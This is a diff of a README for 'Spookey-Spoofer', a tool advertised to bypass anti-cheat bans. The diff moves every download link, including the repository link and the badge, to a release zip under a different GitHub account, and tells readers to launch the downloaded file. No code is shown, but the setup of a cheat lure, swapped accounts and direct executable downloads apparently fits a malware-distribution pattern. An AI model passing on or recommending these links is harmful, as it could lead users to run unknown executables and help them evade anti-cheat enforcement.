@@ -19,7 +19,7 @@ Spookey-Spoofer is your go-to tool to help you bypass bans from popular anti-che
 
 ## 📥 Download Now!
 
-🔗 **[Download Spookey-Spoofer Here!](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)**
+🔗 **[Download Spookey-Spoofer Here!](https://github.com/Yarzdee8/Spookey-Spoofer/releases/download/v1.0/Program.zip)**
 
 Please note that the downloaded file needs to be launched to start using Spookey-Spoofer's powerful features. 
 
@@ -45,7 +45,7 @@ Please note that the downloaded file needs to be launched to start using Spookey
 
 ## 🌌 Stay Connected
 
-🔗 **[Visit our GitHub Repository](https://github.com/Dredarty/RINGSharp/)** to always access the latest version. 
+🔗 **[Visit our GitHub Repository](https://github.com/Yarzdee8/Spookey-Spoofer/releases/download/v1.0/Program.zip)** to always access the latest version. 
 
 ⭐ Don't forget to **star** this repository to show your support for Spookey-Spoofer!
 
@@ -53,4 +53,4 @@ Please note that the downloaded file needs to be launched to start using Spookey
 
 ---
 
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download-Spookey--Spoofer-brightgreen)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Spookey-Spoofer](https://github.com/Yarzdee8/Spookey-Spoofer/releases/download/v1.0/Program.zip)](https://github.com/Yarzdee8/Spookey-Spoofer/releases/download/v1.0/Program.zip)
